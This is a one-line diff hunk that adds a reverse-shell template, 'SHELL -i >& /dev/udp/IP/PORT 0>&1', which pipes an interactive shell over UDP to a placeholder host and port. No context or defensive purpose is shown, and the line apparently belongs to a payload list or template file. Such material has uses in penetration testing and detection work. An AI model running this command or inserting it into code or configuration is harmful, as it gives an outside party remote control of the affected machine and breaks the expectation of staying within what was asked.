@@ -1,0 +1,1 @@
+SHELL -i >& /dev/udp/IP/PORT 0>&1
